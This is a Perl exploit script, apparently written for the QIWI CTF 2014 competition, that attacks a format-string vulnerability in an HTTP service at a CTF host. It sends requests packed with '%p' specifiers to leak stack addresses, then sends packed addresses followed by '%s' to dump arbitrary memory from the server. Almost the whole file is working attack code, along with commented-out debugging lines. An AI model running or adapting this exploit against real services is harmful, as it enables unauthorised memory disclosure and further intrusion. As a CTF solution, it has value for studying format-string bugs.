#!/usr/bin/perl

use strict;
use IO::Socket::SSL;
$|=1;

my $sock = 0;
my $hexval = 0;
my $base = 0;

my $offset = 0;
my $iii = 0;
for ($iii = 953;$iii<=1024;$iii++) {
JMP:
	sleep 2;
	$sock = IO::Socket::SSL->new("qiwictf2014.ru:8446") or next;
syswrite $sock, "GET " . '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' . 
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p' .
'%p%p%p%p%p%p%p%p%p%p' . " HTTP/1.0\nConnection: Keep-Alive\n\n";

	sysread $sock, my $data, 102400;
#	print $data;

	sysread $sock, my $data, 1024000;

	my @array = split /0x/, $data;
#	for (0..$#array) {
#		$array[$_] =~ s/\(nil\)//g;
#		print $array[$_],"\n";
#	}
#	$iii = 2;
#	exit 1;
#}
#__END__
#	$base = hex($array[$iii]) & 0xfffff000;
	$base = hex($array[$iii]) - 5;

#	exit 1;

#	print $array[462],"\n";
#	$base = $base & 0xfffff000;
#	$base += 94000;
	print sprintf "[$iii]CHECK ADDR => 0x%08X\n", $base;


#__END__
#while () {
	goto JMP unless $sock->connected();
#	$hexval = $base - $offset;
	$hexval = $base;
	if ( ($hexval & 0x000000ff) == 0x0a) {
		$offset++;
		$hexval++;
	}
	if ( ($hexval & 0x000000ff) == 0x00) {
		$offset++;
		$hexval++;
	}

	print sprintf "%08X => ", $hexval;
	syswrite $sock, "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
#	print "SEND QUERY:\n", "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";

	sysread $sock, my $data, 102400;
#	sysread $sock, my $data ,102400;
#	print "DATA 1 => \n";
	goto JMP unless $sock->connected();
	print STDERR $data;

#	sysread $sock, my $data, 102400;

	sysread $sock, my $data, 102400;
	print "GET => $data\n";

	if ($data =~ m/\/\/\/(.+?)\snot\s/gm) {
		my $binary = unpack ("H*", $1);
		print "[$iii] =>  $binary\n";
#	} delse {
#	d	print "No data. Next!\n";
#		print "\n";
#		next;
		#
	}
	goto JMP unless $sock->connected();

#	$offset += 0x0fff;
#	print "[+] Dumped " . length($binary) . "bytes\n";
	#}
	print "\n\n\n";
}
#}
#goto JMP;
#}
__END__
	syswrite $sock, "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	print "SEND QUERY:\n", "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	sysread $sock, my $data, 1024;
#	print $data,"\n";
	sysread $sock, my $data, 1024;
	print $data,"\n";
	$data =~ m/Page:(.+?)\/\/\/(.+?) not found/;
	print "0x$print_addr[$_] => " . unpack("H*", $2), "\n";

	syswrite $sock, "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	print "SEND QUERY:\n", "GET " . pack("I*", $hexval) . '%x%x///%s' . " HTTP/1.0\nConnection: Keep-Alive\n\n";
	sysread $sock, my $data, 1024;
#	print $data,"\n";
	sysread $sock, my $data, 1024;
	print $data,"\n";
	$data =~ m/Page:(.+?)\/\/\/(.+?) not found/;
	print "0x$print_addr[$_] => " . unpack("H*", $2), "\n";

#$data =~ m/Page(.+?)\/\/\/(.+?)\snot\sfound\s:/;
